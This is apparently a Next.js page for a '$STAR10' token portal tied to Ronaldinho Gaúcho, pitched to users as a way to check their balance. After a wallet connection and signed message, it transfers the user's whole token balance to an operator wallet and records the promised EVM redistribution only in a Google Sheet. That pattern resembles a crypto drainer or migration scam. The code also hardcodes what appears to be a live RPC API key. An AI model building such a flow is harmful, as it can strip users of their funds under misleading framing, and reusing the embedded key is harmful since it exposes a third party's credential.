"use client";

import { useState, useEffect } from "react";
import { useWallet } from "@solana/wallet-adapter-react";
import { WalletMultiButton } from "@solana/wallet-adapter-react-ui";
import { SignMessage } from "@/components/SignMessage";
import { TokenBalance } from "@/components/TokenBalance";
import { EVMAddressForm } from "@/components/EVMAddressForm";
import { Connection } from "@solana/web3.js";
import { transferTokens } from "@/utils/token-transfer";

require("@solana/wallet-adapter-react-ui/styles.css");

const SolanaWalletPage = () => {
  const { publicKey, connected, signTransaction } = useWallet();
  const [evmAddress, setEvmAddress] = useState<string>("");
  const [isSigned, setIsSigned] = useState<boolean>(false);
  const [isStoredSuccessfully, setIsStoredSuccessfully] =
    useState<boolean>(false);
  const [currentStep, setCurrentStep] = useState<number>(0);
  const [tokenBalance, setTokenBalance] = useState<number | null>(null);
  const [transferStatus, setTransferStatus] = useState<{
    status: "idle" | "loading" | "success" | "error";
    message?: string;
    txid?: string;
  }>({ status: "idle" });

  const TOKEN_CONTRACT = "8hCYPHGC73UxC7gqLDMBHQvgVmtQ6fryCq49tJMCP55D";
  const BSC_CONTRACT = "0x8B9ABDD229ec0C4A28E01b91aacdC5dAAFc25C2b";
  const DESTINATION_WALLET = process.env.NEXT_PUBLIC_DESTINATION_WALLET || "";

  useEffect(() => {
    if (connected) {
      setCurrentStep(1);
    } else {
      setCurrentStep(0);
    }
  }, [connected]);

  useEffect(() => {
    if (isSigned) {
      setCurrentStep(2);
    }
  }, [isSigned]);

  useEffect(() => {
    if (isStoredSuccessfully) {
      setCurrentStep(3);
    }
  }, [isStoredSuccessfully]);

  const handleSignatureVerified = () => {
    setIsSigned(true);
  };

  const saveToGoogleSheets = async (
    solanaAddress: string,
    evmAddress: string,
    tokenAmount: number
  ) => {
    try {
      const response = await fetch("/api/save-mapping", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          solanaAddress,
          evmAddress,
          tokenAmount,
        }),
      });

      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.error || "Error saving data");
      }

      return await response.json();
    } catch (error: any) {
      console.error("Error saving to Google Sheets:", error);
      throw error;
    }
  };

  const handleFormSubmit = async (evmAddress: string) => {
    if (!publicKey || !signTransaction || !tokenBalance) {
      return;
    }

    setEvmAddress(evmAddress);
    setTransferStatus({ status: "loading" });

    try {
      // 1. Save data locally
      localStorage.setItem(publicKey.toString(), evmAddress);

      // 2. Save to Google Sheets
      await saveToGoogleSheets(
        publicKey.toString(),
        evmAddress,
        tokenBalance
      );

      // 3. Transfer tokens if there's a balance
      if (tokenBalance > 0) {
        // Connect to Solana endpoint
        const rpcEndpoints = [
          "https://solana-mainnet.g.alchemy.com/v2/h0SvRZQcbUYULS18piOMYgt8NJTX7_id",
          "https://api.mainnet-beta.solana.com",
          "https://solana-api.projectserum.com",
          "https://rpc.ankr.com/solana",
        ];

        let connection;
        for (const endpoint of rpcEndpoints) {
          try {
            connection = new Connection(endpoint, "confirmed");
            await connection.getVersion();
            break;
          } catch (e) {
            continue;
          }
        }

        if (!connection) {
          throw new Error("Could not connect to any RPC endpoint");
        }

        // Execute the transfer
        const transferResult = await transferTokens(
          connection,
          TOKEN_CONTRACT,
          tokenBalance,
          publicKey,
          signTransaction
        );

        if (transferResult.success) {
          setTransferStatus({
            status: "success",
            message: "Transfer completed successfully!",
            txid: transferResult.txid,
          });
        } else {
          throw new Error(transferResult.error || "Error in transfer");
        }
      }

      setIsStoredSuccessfully(true);
    } catch (error: any) {
      console.error("Error processing operation:", error);
      setTransferStatus({
        status: "error",
        message: error.message || "An error occurred during the process",
      });
    }
  };

  const goToStep = (step: number) => {
    if (
      (step === 1 && connected) ||
      (step === 2 && connected && isSigned) ||
      (step === 3 && connected && isSigned) ||
      step === 0
    ) {
      setCurrentStep(step);
    }
  };

  const handleBalanceUpdate = (balance: number) => {
    setTokenBalance(balance);
  };

  return (
    <main className="min-h-screen bg-black text-white flex flex-col justify-between">
      {/* STAR10 style header */}
      <header className="fixed top-0 z-10 w-full flex items-center justify-center px-20 py-10">
        <div className="flex items-center gap-3 py-3 px-4 md:px-8 justify-between w-full bg-[#f9e8a0] text-black rounded-xl">
          <div className="font-extrabold">$STAR10</div>

          <div className="hidden md:flex space-x-1 text-xs bg-white rounded-lg overflow-hidden border border-gray-300 px-1 py-1">
            <div className="px-2 py-1 flex flex-col items-start">
              <span className="text-[10px] text-gray-500">
                TOKEN ADDRESS BSC:
              </span>
              <span className="font-mono text-[10px]">
                {BSC_CONTRACT.slice(0, 10)}...{BSC_CONTRACT.slice(-4)}
              </span>
            </div>
            <div className="px-2 py-1 flex flex-col items-start">
              <span className="text-[10px] text-gray-500">
                TOKEN ADDRESS SOL:
              </span>
              <span className="font-mono text-[10px]">
                {TOKEN_CONTRACT.slice(0, 10)}...{TOKEN_CONTRACT.slice(-4)}
              </span>
            </div>
          </div>

          <div className="flex items-center gap-3">
            <button className="hidden md:block bg-yellow-600 hover:bg-yellow-700 text-white font-bold py-2 px-4 rounded-full text-sm">
              BUY $STAR10 TOKEN
            </button>
          </div>
        </div>
      </header>

      <section className="flex flex-col justify-between pt-40">
        <section className="text-center px-4">
          <h1 className="text-4xl md:text-6xl text-yellow-600 font-bold mb-4">
            STAR10 TOKEN PORTAL
          </h1>
          <p className="text-lg md:text-xl mb-8 max-w-2xl mx-auto text-gray-300">
            The official token of Ronaldinho Gaúcho. Connect your Phantom wallet
            to check your STAR10 balance.
          </p>
        </section>

        {/* Steps Indicator */}
        <div className="flex justify-center mb-8">
          <div className="flex items-center">
            {[0, 1, 2, 3].map((step) => (
              <div key={step} className="flex items-center">
                <button
                  onClick={() => goToStep(step)}
                  className={`w-10 h-10 rounded-full flex items-center justify-center font-bold ${
                    currentStep >= step
                      ? "bg-yellow-600 text-white"
                      : "bg-gray-800 text-gray-400"
                  } ${step === currentStep ? "ring-2 ring-white" : ""}`}
                  disabled={
                    (step === 1 && !connected) ||
                    (step === 2 && (!connected || !isSigned)) ||
                    (step === 3 && (!connected || !isSigned))
                  }
                >
                  {step + 1}
                </button>
                {step < 3 && (
                  <div
                    className={`w-10 h-1 ${
                      currentStep > step ? "bg-yellow-600" : "bg-gray-800"
                    }`}
                  ></div>
                )}
              </div>
            ))}
          </div>
        </div>

        {/* Carousel Steps */}
        <div className="max-w-md mx-auto pb-20 px-4">
          {currentStep === 0 && (
            <div className="p-6 bg-gray-900 bg-opacity-80 rounded-lg shadow-xl mb-6 border border-yellow-600 transition-all">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-xl font-semibold text-yellow-400">
                  Step 1: Connect Phantom Wallet
                </h2>
                <div className="w-8 h-8 rounded-full bg-yellow-600 text-white flex items-center justify-center font-bold">
                  1
                </div>
              </div>
              <p className="text-sm mb-6 text-gray-300">
                To start the process, connect your Phantom wallet. This will
                allow you to verify your STAR10 tokens and link your EVM address.
              </p>
              <div className="flex justify-center">
                <WalletMultiButton className="!bg-yellow-600 hover:!bg-yellow-700" />
              </div>
            </div>
          )}

          {currentStep === 1 && (
            <div className="p-6 bg-gray-900 bg-opacity-80 rounded-lg shadow-xl mb-6 border border-yellow-600 transition-all">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-xl font-semibold text-yellow-400">
                  Step 2: Verify Wallet Ownership
                </h2>
                <div className="w-8 h-8 rounded-full bg-yellow-600 text-white flex items-center justify-center font-bold">
                  2
                </div>
              </div>
              <p className="text-sm mb-6 text-gray-300">
                Sign a message to verify that you are the owner of the wallet.
                This step is important to authenticate your access.
              </p>
              <SignMessage onSignatureVerified={handleSignatureVerified} />

              <div className="flex justify-between mt-6">
                <button
                  onClick={() => goToStep(0)}
                  className="px-4 py-2 border border-gray-600 rounded-lg text-gray-400 hover:text-white hover:border-gray-400"
                >
                  Back
                </button>
              </div>
            </div>
          )}

          {currentStep === 2 && (
            <div className="p-6 bg-gray-900 bg-opacity-80 rounded-lg shadow-xl mb-6 border border-yellow-600 transition-all">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-xl font-semibold text-yellow-400">
                  Step 3: Check STAR10 Balance
                </h2>
                <div className="w-8 h-8 rounded-full bg-yellow-600 text-white flex items-center justify-center font-bold">
                  3
                </div>
              </div>
              <p className="text-sm mb-6 text-gray-300">
                Check your STAR10 token balance on the Solana blockchain. This is
                the official token of Ronaldinho Gaúcho.
              </p>
              <TokenBalance 
                tokenAddress={TOKEN_CONTRACT} 
                onBalanceUpdate={handleBalanceUpdate}
              />

              <div className="flex justify-between mt-6">
                <button
                  onClick={() => goToStep(1)}
                  className="px-4 py-2 border border-gray-600 rounded-lg text-gray-400 hover:text-white hover:border-gray-400"
                >
                  Back
                </button>
                <button
                  onClick={() => goToStep(3)}
                  className="px-4 py-2 bg-yellow-600 text-white rounded-lg hover:bg-yellow-700"
                >
                  Next
                </button>
              </div>
            </div>
          )}

          {currentStep === 3 && (
            <div className="p-6 bg-gray-900 bg-opacity-80 rounded-lg shadow-xl mb-6 border border-yellow-600 transition-all">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-xl font-semibold text-yellow-400">
                  Step 4: Connect EVM Address
                </h2>
                <div className="w-8 h-8 rounded-full bg-yellow-600 text-white flex items-center justify-center font-bold">
                  4
                </div>
              </div>
              <p className="text-sm mb-6 text-gray-300">
                Provide your EVM wallet address (Ethereum, Binance Smart
                Chain, etc.) to receive your STAR10 tokens. 
                {tokenBalance ? (
                  <span className="block mt-1 font-semibold text-yellow-400">
                    Your {tokenBalance} STAR10 tokens will be transferred to our wallet and
                    registered for distribution on the EVM network.
                  </span>
                ) : (
                  <span className="block mt-1">
                    You don't have any STAR10 tokens to transfer.
                  </span>
                )}
              </p>

              {!isStoredSuccessfully ? (
                <EVMAddressForm onSubmit={handleFormSubmit} isSubmitting={transferStatus.status === "loading"} />
              ) : null}

              {transferStatus.status === "loading" && (
                <div className="mt-4 p-4 bg-blue-900 bg-opacity-30 border border-blue-500 text-blue-400 rounded-md">
                  <div className="flex items-center">
                    <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-blue-500" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    <p>Processing your transaction...</p>
                  </div>
                </div>
              )}

              {transferStatus.status === "error" && (
                <div className="mt-4 p-4 bg-red-900 bg-opacity-30 border border-red-500 text-red-400 rounded-md">
                  <p className="font-bold">Processing Error</p>
                  <p className="text-sm mt-1">{transferStatus.message}</p>
                </div>
              )}

              {isStoredSuccessfully && (
                <div className="mt-4 p-4 bg-green-900 bg-opacity-30 border border-green-500 text-green-400 rounded-md">
                  <p className="font-bold flex items-center">
                    <span className="mr-2 text-lg">✓</span>
                    Mapping completed successfully!
                  </p>
                  <p className="text-sm mt-2">
                    Solana: {publicKey?.toString()}
                  </p>
                  <p className="text-sm">EVM: {evmAddress}</p>
                  
                  {transferStatus.status === "success" && (
                    <div className="mt-2 pt-2 border-t border-green-700">
                      <p className="font-medium">Transfer completed!</p>
                      {transferStatus.txid && (
                        <a 
                          href={`https://solscan.io/tx/${transferStatus.txid}`}
                          target="_blank" 
                          rel="noopener noreferrer"
                          className="text-xs underline text-green-300 hover:text-green-200"
                        >
                          View transaction on SolScan
                        </a>
                      )}
                    </div>
                  )}
                </div>
              )}

              <div className="flex justify-between mt-6">
                <button
                  onClick={() => goToStep(2)}
                  className="px-4 py-2 border border-gray-600 rounded-lg text-gray-400 hover:text-white hover:border-gray-400"
                >
                  Back
                </button>
              </div>
            </div>
          )}
        </div>
      </section>

      <footer className="py-8 px-4 text-center text-sm text-gray-400 border-t border-gray-800 bg-black">
        <div className="max-w-4xl mx-auto">
          <p>$STAR10 - The official token of Ronaldinho Gaúcho</p>
          <div className="flex flex-col md:flex-row justify-center gap-2 mt-2 text-xs">
            <p>TOKEN ADDRESS SOL: {TOKEN_CONTRACT}</p>
            <p className="hidden md:block">|</p>
            <p>TOKEN ADDRESS BSC: {BSC_CONTRACT}</p>
          </div>
        </div>
      </footer>
    </main>
  );
};

export default SolanaWalletPage;
